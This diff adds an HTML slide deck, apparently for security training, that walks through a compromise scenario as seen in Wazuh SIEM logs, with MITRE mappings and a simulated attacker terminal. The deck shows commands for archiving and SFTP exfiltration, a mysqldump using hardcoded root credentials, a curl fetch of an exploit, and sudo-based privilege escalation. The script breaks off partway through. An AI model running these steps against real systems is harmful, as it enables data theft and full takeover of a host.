@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Steps 5–9: Compromise Scenario</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#020b10; --panel:#040f18; --border:#0d3a4a;
+    --green:#00ff9d; --cyan:#00d4ff; --red:#ff3c5a;
+    --yellow:#ffd700; --text:#8ab8c8; --dim:#3a5a6a;
+    --mono:'Share Tech Mono',monospace;
+    --display:'Orbitron',sans-serif;
+    --body:'Rajdhani',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:var(--body);height:100vh;width:100vw;overflow:hidden;}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.06) 2px,rgba(0,0,0,0.06) 4px);pointer-events:none;z-index:9999;}
+
+  .slide{position:absolute;inset:0;display:none;opacity:0;transition:opacity 0.4s;flex-direction:column;background:var(--bg);height:100vh;}
+  .slide.active{display:flex;} .slide.visible{opacity:1;}
+
+  /* ── Topbar ── */
+  .topbar{display:flex;justify-content:space-between;align-items:center;padding:10px 28px;border-bottom:1px solid var(--border);background:rgba(4,15,24,0.98);flex-shrink:0;z-index:10;height:50px;}
+  .logo{font-family:var(--display);font-size:11px;color:var(--cyan);letter-spacing:3px;}
+  .tlp{background:#8b0000;color:#fff;font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:2px;letter-spacing:2px;}
+  .topbar-right{font-family:var(--mono);font-size:11px;color:var(--dim);display:flex;gap:24px;}
+  .topbar-right span b{color:var(--text);font-weight:normal;}
+
+  /* ── Stepbar ── */
+  .stepbar{display:flex;align-items:center;gap:25px;padding:8px 28px;border-bottom:1px solid var(--border);background:rgba(0,212,255,0.03);flex-shrink:0;z-index:10;height:60px;}
+  .step-num{font-family:var(--display);font-size:20px;color:var(--dim);letter-spacing:2px;}
+  .step-name{font-family:var(--display);font-size:20px;color:var(--cyan);letter-spacing:1px;flex:1;}
+  .step-time{font-family:var(--mono);font-size:20px;color:var(--yellow);}
+  .step-mitre{font-family:var(--mono);font-size:20px;color:var(--green);border:1px solid rgba(0,255,157,0.3);padding:2px 8px;border-radius:2px;}
+
+  /* ── Layout ── */
+  .slide-body{flex:1 1 auto;display:flex;overflow:hidden;position:relative;}
+
+  .scroll-body{flex:1 1 auto;overflow-y:auto;padding:24px 32px 80px 32px;display:flex;flex-direction:column;gap:28px;scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--cyan) transparent;transition:flex 0.35s ease;}
+  .scroll-body::-webkit-scrollbar{width:6px;}
+  .scroll-body::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:3px;}
+  .scroll-body::-webkit-scrollbar-thumb{background:var(--cyan);border-radius:3px;}
+  .scroll-body::-webkit-scrollbar-thumb:hover{background:var(--green);}
+
+  /* ── Log cards ── */
+  .log-card{border:1px solid var(--border);border-radius:4px;background:#010c15;overflow:hidden;opacity:0;transform:translateY(16px);transition:opacity 0.5s,transform 0.5s;display:flex;flex-direction:column;flex-shrink:0;}
+  .log-card.shown{opacity:1;transform:translateY(0);}
+  .card-label{display:flex;justify-content:space-between;align-items:center;padding:9px 18px;background:rgba(0,0,0,0.5);border-bottom:1px solid var(--border);flex-shrink:0;}
+  .card-label-left{font-family:var(--mono);font-size:12px;color:var(--cyan);}
+  .card-label-right{font-family:var(--mono);font-size:11px;color:var(--yellow);}
+
+  .card-img-wrap{position:relative;cursor:zoom-in;overflow:hidden;border-bottom:1px solid var(--border);background:#010912;}
+  .card-img-wrap::after{content:'🔍 click to expand';position:absolute;bottom:8px;right:10px;font-family:var(--mono);font-size:10px;color:var(--cyan);background:rgba(2,11,16,0.82);padding:3px 9px;border-radius:2px;border:1px solid rgba(0,212,255,0.3);opacity:0;transition:opacity 0.25s;pointer-events:none;}
+  .card-img-wrap:hover::after{opacity:1;}
+  .card-img{width:100%;display:block;transition:filter 0.25s;image-rendering:-webkit-optimize-contrast;}
+  .card-img-wrap:hover .card-img{filter:brightness(1.1);}
+  .card-img-placeholder{width:100%;min-height:120px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:14px;color:var(--dim);}
+
+  .card-desc{padding:18px 22px;font-family:var(--mono);font-size:18px;line-height:1.6;color:var(--text);flex-shrink:0;background:#010c15;}
+  .card-desc .key{color:var(--yellow);}
+  .card-desc .val{color:var(--red);}
+  .card-desc .ok {color:var(--green);}
+  .card-desc .note{color:var(--cyan);}
+
+  /* ── Attacker Terminal Panel ── */
+  .attacker-terminal{width:0;flex-shrink:0;overflow:hidden;border-left:1px solid var(--border);background:#080808;display:flex;flex-direction:column;transition:width 0.35s ease;}
+  .attacker-terminal.open{width:42%;}
+
+  .term-titlebar{display:flex;align-items:center;gap:10px;padding:8px 14px;background:#1a1a1a;border-bottom:1px solid #333;flex-shrink:0;height:36px;}
+  .term-dot{width:12px;height:12px;border-radius:50%;flex-shrink:0;}
+  .term-dot.close{background:#ff5f57;} .term-dot.min{background:#febc2e;} .term-dot.max{background:#28c840;}
+  .term-title-label{font-family:var(--mono);font-size:11px;color:#888;margin-left:6px;flex:1;text-align:center;}
+
+  .term-output{flex:1 1 auto;overflow-y:auto;padding:14px 16px;font-family:var(--mono);font-size:12.5px;line-height:1.65;color:#ccc;scrollbar-width:thin;scrollbar-color:#333 transparent;text-shadow:0 0 6px rgba(0,255,80,0.12);}
+  .term-output::-webkit-scrollbar{width:4px;}
+  .term-output::-webkit-scrollbar-thumb{background:#333;border-radius:2px;}
+
+  .term-line              {display:block;white-space:pre-wrap;word-break:break-all;}
+  .term-line.prompt       {color:#ff4444;}
+  .term-line.out          {color:#aaaaaa;}
+  .term-line.out-highlight{color:#ffd700;}
+  .term-line.out-warn     {color:#ff8c00;}
+  .term-line.out-ok       {color:#00ff9d;}
+  .term-line.out-err      {color:#ff3c5a;}
+  .term-line.comment      {color:#444;font-style:italic;}
+  .term-line.spacer       {display:block;height:6px;}
+
+  @keyframes blink{0%,49%{opacity:1}50%,100%{opacity:0}}
+  .cursor{display:inline-block;width:8px;height:14px;background:#00ff41;vertical-align:middle;animation:blink 1s step-end infinite;margin-left:2px;}
+
+  /* ── Toggle Button ── */
+  .terminal-toggle-btn{position:fixed;bottom:14px;right:90px;z-index:300;font-family:var(--mono);font-size:11px;color:var(--green);background:rgba(2,11,16,0.92);border:1px solid rgba(0,255,157,0.35);padding:5px 14px;border-radius:2px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;display:flex;align-items:center;gap:6px;}
+  .terminal-toggle-btn:hover{border-color:var(--green);box-shadow:0 0 14px rgba(0,255,157,0.25);color:#fff;}
+  .term-indicator{width:7px;height:7px;border-radius:50%;background:var(--red);animation:blink 0.9s step-end infinite;display:inline-block;}
+  .terminal-toggle-btn.active .term-indicator{background:var(--green);}
+
+  /* ── Lightbox ── */
+  #lightbox{position:fixed;inset:0;z-index:10000;background:rgba(2,11,16,0.93);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;cursor:zoom-out;}
+  #lightbox.open{display:flex;}
+  #lightbox-img{max-width:92vw;max-height:90vh;border:1px solid var(--cyan);border-radius:4px;box-shadow:0 0 60px rgba(0,212,255,0.25),0 0 120px rgba(0,212,255,0.08);animation:lbIn 0.22s ease;object-fit:contain;}
+  @keyframes lbIn{from{opacity:0;transform:scale(0.88);}to{opacity:1;transform:scale(1);}}
+  #lightbox-close{position:fixed;top:18px;right:22px;font-family:var(--mono);font-size:16px;color:var(--cyan);cursor:pointer;z-index:10001;background:rgba(2,11,16,0.85);border:1px solid var(--border);padding:5px 14px;border-radius:3px;transition:color 0.2s,border-color 0.2s;}
+  #lightbox-close:hover{color:var(--red);border-color:var(--red);}
+  #lightbox-caption{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:11px;color:var(--dim);background:rgba(2,11,16,0.85);padding:4px 16px;border-radius:2px;border:1px solid var(--border);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:80vw;}
+
+  /* ── Nav ── */
+  .slide-nav{position:fixed;bottom:14px;left:50%;transform:translateX(-50%);display:flex;gap:8px;z-index:200;}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--dim);cursor:pointer;transition:all 0.3s;}
+  .dot.active{background:var(--cyan);box-shadow:0 0 8px var(--cyan);}
+  .nav-hint{position:fixed;bottom:14px;right:24px;font-family:var(--mono);font-size:10px;color:var(--dim);z-index:200;}
+</style>
+</head>
+<body>
+
+<!-- LIGHTBOX -->
+<div id="lightbox">
+  <span id="lightbox-close">✕ ESC</span>
+  <img id="lightbox-img" src="" alt="">
+  <div id="lightbox-caption"></div>
+</div>
+
+<!-- TOGGLE BUTTON -->
+<button class="terminal-toggle-btn" id="termToggleBtn" onclick="toggleTerminal()">
+  <span class="term-indicator"></span>
+  ATTACKER TERMINAL
+</button>
+
+
+<!-- ═══════════════════════════════════════════════════════
+     SLIDE 0 — Step 5: Archiving & Compression
+     Cards: lc0, lc1, lc2
+═══════════════════════════════════════════════════════════ -->
+<div class="slide" id="slide-0">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b>stt</b></span>
+      <span>TIME <b>21:45:55</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 5A</span>
+    <span class="step-name">Data Exfiltration — Archiving &amp; Compression</span>
+    <span class="step-time">21:45:55.000</span>
+    <span class="step-mitre">T1560 · T1560.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+
+      <div class="log-card" id="lc0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/tar</span>
+          <span class="card-label-right">MITRE T1560</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/7.png" alt="Log 7"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 7.png ]</div>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/7-1.png" alt="Log 7-1"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 7-1.png ]</div>
+        </div>
+        <div class="card-desc">
+          OSsec detects the execution of <span class="key">/usr/bin/tar</span> on May 8 at <span class="key">21:45:55</span>. System audit logs confirm the arguments: <span class="val">tar -czf /home/stt/everything.tar.gz</span>, showing the creation of a compressed archive in the user's home directory.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc1">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — SYSCALL execve: /usr/bin/gzip</span>
+          <span class="card-label-right">MITRE T1560.001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/8-1.png" alt="Log 8"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 8.png ]</div>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/8.png" alt="Log 8-1"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 8-1.png ]</div>
+        </div>
+        <div class="card-desc">
+          Following the tar command, OSsec records <span class="key">/usr/bin/gzip</span> spawned as a child process. The SYSCALL execve event shows gzip running inside <span class="key">/home/stt</span>, confirming active compression.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc2">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/env</span>
+          <span class="card-label-right">MITRE T1048</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/9.png" alt="Log 9"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 9.png ]</div>
+        </div>
+        <div class="card-desc">
+          Less than a minute later at <span class="key">21:46:45</span>, a new OSsec alert fires for <span class="key">/usr/bin/env</span> — indicating the attacker is preparing a transfer environment, likely staging the archive for the upcoming SFTP session.
+        </div>
+      </div>
+
+    </div>
+    <div class="attacker-terminal" id="terminal-0">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — archiving</span>
+      </div>
+      <div class="term-output" id="term-output-0"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════════
+     SLIDE 1 — Step 6: SFTP Exfiltration
+     Cards: lc3
+═══════════════════════════════════════════════════════════ -->
+<div class="slide" id="slide-1">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>OSsec / sshd</b></span>
+      <span>SOURCE IP <b style="color:var(--red)">105.68.208.123</b></span>
+      <span>TIME <b>21:46:50</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 6</span>
+    <span class="step-name">Exfiltration via SFTP — New SSH Session</span>
+    <span class="step-time">21:46:50.000</span>
+    <span class="step-mitre">T1048.002 · Exfil over Encrypted Channel</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+
+      <div class="log-card" id="lc3">
+        <div class="card-label">
+          <span class="card-label-left">sshd Auth Logs — open SSH → sftp-server subsystem → close SSH</span>
+          <span class="card-label-right">MITRE T1048.002</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/open_ssh(2)-sftp-close_ssh.png" alt="SSH SFTP cycle"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: open_ssh(2)-sftp-close_ssh.png ]</div>
+        </div>
+        <div class="card-desc">
+          Authentication logs record a complete connection cycle: an <span class="ok">SSH session opens</span> from <span class="val">105.68.208.123</span>, the <span class="key">sftp-server</span> subsystem is invoked to transfer <span class="key">everything.tar.gz</span>, then the <span class="val">SSH session closes immediately</span> — a clean exfiltration pattern.
+        </div>
+      </div>
+
+    </div>
+    <div class="attacker-terminal" id="terminal-1">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">attacker@local — sftp exfiltration</span>
+      </div>
+      <div class="term-output" id="term-output-1"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════════
+     SLIDE 2 — Step 7: Post-Exfil Exploration & Credential Theft
+     Cards: lc4, lc5, lc6
+═══════════════════════════════════════════════════════════ -->
+<div class="slide" id="slide-2">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b>stt</b></span>
+      <span>TIME <b>21:47:10</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 7</span>
+    <span class="step-name">Post-Exfiltration Exploration &amp; Credential Theft</span>
+    <span class="step-time">21:47:10.000</span>
+    <span class="step-mitre">T1083 · T1552.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+
+      <div class="log-card" id="lc4">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/cat</span>
+          <span class="card-label-right">MITRE T1083</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/exploration post exfiltrartion/1-cat.png" alt="cat command"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 1-cat.png ]</div>
+        </div>
+        <div class="card-desc">
+          OSsec detects <span class="key">/usr/bin/cat</span> — used in post-compromise phase to manually read local files and explore the filesystem on the target machine.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc5">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/vim (app.py)</span>
+          <span class="card-label-right">MITRE T1083</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/exploration post exfiltrartion/2-vim(app.py).png" alt="vim app.py"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: 2-vim(app.py).png ]</div>
+        </div>
+        <div class="card-desc">
+          Shortly after, <span class="key">/usr/bin/vim</span> is recorded opening <span class="val">app.py</span>. The attacker inspects the application's source code, searching for hardcoded secrets and database credentials.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc6">
+        <div class="card-label">
+          <span class="card-label-left">Source Code — Hardcoded MySQL credentials discovered in app.py</span>
+          <span class="card-label-right">MITRE T1552.001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/hard_coded_creds_of_mysql.png" alt="Hardcoded creds"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: hard_coded_creds_of_mysql.png ]</div>
+        </div>
+        <div class="card-desc">
+          Inspection of <span class="key">app.py</span> exposes hardcoded MySQL credentials: user <span class="val">root</span> / password <span class="val">password123</span>. These grant the attacker direct access to the application's database.
+        </div>
+      </div>
+
+    </div>
+    <div class="attacker-terminal" id="terminal-2">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — credential harvest</span>
+      </div>
+      <div class="term-output" id="term-output-2"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════════
+     SLIDE 3 — Step 8: Database Exfiltration via mysqldump
+     Cards: lc7, lc8, lc9
+═══════════════════════════════════════════════════════════ -->
+<div class="slide" id="slide-3">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b>stt</b></span>
+      <span>TIME <b>21:50:33</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 8</span>
+    <span class="step-name">Database Exfiltration via mysqldump</span>
+    <span class="step-time">21:50:33.000</span>
+    <span class="step-mitre">T1567 · T1552.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+
+      <div class="log-card" id="lc7">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/mysqldump</span>
+          <span class="card-label-right">MITRE T1567</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/mysqldump/mysqldump(exfiltration of DB).png" alt="mysqldump audit"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: mysqldump.png ]</div>
+        </div>
+        <div class="card-desc">
+          OSsec records <span class="key">/usr/bin/mysqldump</span> at <span class="key">21:50:33</span>. The attacker begins extracting the <span class="val">zipvault</span> database using the root MySQL credentials found in <span class="key">app.py</span>.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc8">
+        <div class="card-label">
+          <span class="card-label-left">full_log — SYSCALL execve: cleartext credentials in arguments</span>
+          <span class="card-label-right">MITRE T1552.001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/mysqldump/full-log-mysqldump.png" alt="full log mysqldump"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: full-log-mysqldump.png ]</div>
+        </div>
+        <div class="card-desc">
+          The detailed SYSCALL log reveals cleartext arguments: <span class="val">-u root -p password123</span>. The attacker successfully reuses the password extracted from <span class="key">app.py</span> to dump the entire <span class="val">zipvault</span> database.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc9">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/cat (dump verification)</span>
+          <span class="card-label-right">MITRE T1083</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/mysqldump/verification _of_ _sql_dump.png" alt="cat dump verify"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: verification_of_sql_dump.png ]</div>
+        </div>
+        <div class="card-desc">
+          A <span class="key">/usr/bin/cat</span> command at <span class="key">21:51:19</span> confirms the attacker reads back the SQL dump to verify the extraction was complete before proceeding to final exfiltration.
+        </div>
+      </div>
+
+    </div>
+    <div class="attacker-terminal" id="terminal-3">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — db exfiltration</span>
+      </div>
+      <div class="term-output" id="term-output-3"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════════
+     SLIDE 4 — Step 9: Privilege Escalation
+     Cards: lc10–lc15
+═══════════════════════════════════════════════════════════ -->
+<div class="slide" id="slide-4">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b style="color:var(--red)">stt → root</b></span>
+      <span>TIME <b>21:52:00</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 9</span>
+    <span class="step-name">Privilege Escalation — Full Root Access</span>
+    <span class="step-time">21:52:00.000</span>
+    <span class="step-mitre">T1105 · T1110 · T1082 · T1548.001 · T1548.003</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+
+      <div class="log-card" id="lc10">
+        <div class="card-label">
+          <span class="card-label-left">Attempt 1 — Exploit download via curl (copy.fail/exp)</span>
+          <span class="card-label-right">MITRE T1105</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl.png" alt="curl exploit"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: curl.png ]</div>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl-args.png" alt="curl args"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: curl-args.png ]</div>
+        </div>
+        <div class="card-desc">
+          The attacker attempts to download a public exploit from <span class="val">copy.fail/exp</span> using <span class="key">curl</span>. The arguments log reveals the full destination URL — host resolution fails.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc11">
+        <div class="card-label">
+          <span class="card-label-left">Attempt 2 — User switch failure via su (PAM auth failure)</span>
+          <span class="card-label-right">MITRE T1110</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/su/su-refused.png" alt="su refused"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: su-refused.png ]</div>
+        </div>
+        <div class="card-desc">
+          Attempt to switch to root via <span class="key">su</span>. Wazuh records a <span class="val">PAM authentication failure</span> — the attacker does not know the system root password.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc12">
+        <div class="card-label">
+          <span class="card-label-left">Attempt 3 — Kernel version enumeration: uname -r</span>
+          <span class="card-label-right">MITRE T1082</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/uname/uname-r.png" alt="uname -r"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: uname-r.png ]</div>
+        </div>
+        <div class="card-desc">
+          Execution of <span class="key">uname -r</span> to fingerprint the exact Linux kernel version and search for applicable Local Privilege Escalation (LPE) exploits.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc13">
+        <div class="card-label">
+          <span class="card-label-left">Attempt 4 — SUID binary search: find / -perm -4000</span>
+          <span class="card-label-right">MITRE T1548.001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/find/find(loking for suid).png" alt="find SUID"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: find-suid.png ]</div>
+        </div>
+        <div class="card-desc">
+          The attacker uses <span class="key">find</span> with <span class="val">-perm -4000</span> to enumerate all SUID binaries, searching for misconfigured executables that could be abused for privilege escalation.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc14">
+        <div class="card-label">
+          <span class="card-label-left">Attempt 5 — sudo -l reveals NOPASSWD: ALL misconfiguration</span>
+          <span class="card-label-right">MITRE T1548.003</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: sudo_-l.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">sudo -l</span> exposes a critical misconfiguration: user <span class="val">stt</span> has <span class="val">NOPASSWD: ALL</span> rights. Any command can be run as root with no password required.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc15">
+        <div class="card-label">
+          <span class="card-label-left">ESCALATION SUCCESS — sudo -i · EUID=0 · Root shell opened</span>
+          <span class="card-label-right">⚠ FULL SYSTEM COMPROMISE</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: sudo2(-i).png ]</div>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/full_log_sudo2.png" alt="full log sudo2"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: full_log_sudo2.png ]</div>
+        </div>
+        <div class="card-desc">
+          The attacker executes <span class="key">sudo -i</span>. The audit log confirms escalation: <span class="ok">EUID=0 (root)</span>. A privileged interactive shell is opened — the system is fully compromised.
+        </div>
+      </div>
+
+    </div>
+    <div class="attacker-terminal" id="terminal-4">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — privilege escalation</span>
+      </div>
+      <div class="term-output" id="term-output-4"></div>
+    </div>
+  </div>
+</div>
+
+
+<div class="slide-nav" id="nav"></div>
+<div class="nav-hint">← → / SPACE</div>
+
+<script>
+const TOTAL = 5;
+
+/* ═══════════════════════════════════════════════════════════
+   ATTACKER TERMINAL CONTENT
+═══════════════════════════════════════════════════════════ */
+const SLIDE_TERMINAL_CONTENT = {
+
+  /* ── Slide 0 : Archiving & Compression ─────────────── */
+  0: [
+    { out: '# [21:45:52] Logged in as stt@target', cls: 'comment' },
+    { spacer: true },
+    { out: '# Step 1 — archive the entire home directory', cls: 'comment' },
+    { cmd: 'tar -czf /home/stt/everything.tar.gz /home/stt/' },
+    { out: 'tar: Removing leading / from member names', cls: 'out-warn' },
+    { spacer: true },
+    { out: '# Confirm archive was created', cls: 'comment' },
+    { cmd: 'ls -lh /home/stt/everything.tar.gz' },
+    { out: '-rw-r--r-- 1 stt stt 14M May  8 21:45 /home/stt/everything.tar.gz', cls: 'out-ok' },
+    { spacer: true },
+    { out: '# [21:46:45] Prepare transfer environment', cls: 'comment' },
+    { cmd: 'env | grep -i ssh' },
+    { out: 'SSH_CLIENT=192.168.1.42 51234 22', cls: 'out' },
+    { out: 'SSH_CONNECTION=192.168.1.42 51234 10.0.0.5 22', cls: 'out' },
+  ],
+
+  /* ── Slide 1 : SFTP Exfiltration ───────────────────── */
+  1: [
+    { out: '# [21:46:50] Open new SSH session for file transfer', cls: 'comment' },
+    { spacer: true },
+    { cmd: 'sftp stt@10.0.0.5' },
+    { out: 'Connected to 10.0.0.5.', cls: 'out-ok' },
+    { spacer: true },
+    { cmd: 'get /home/stt/everything.tar.gz ./loot/' },
+    { out: 'Fetching /home/stt/everything.tar.gz to ./loot/everything.tar.gz', cls: 'out' },
+    { out: '/home/stt/everything.tar.gz   100%   14MB   2.3MB/s   00:06', cls: 'out-ok' },
+    { spacer: true },
+    { cmd: 'bye' },
+    { out: '# SSH session closed immediately after transfer', cls: 'comment' },
+    { out: '# Archive successfully exfiltrated', cls: 'out-ok' },
+  ],
+
+  /* ── Slide 2 : Credential Harvest ──────────────────── */
+  2: [
+    { out: '# [21:47:10] Back on target — post-exfil recon', cls: 'comment' },
+    { spacer: true },
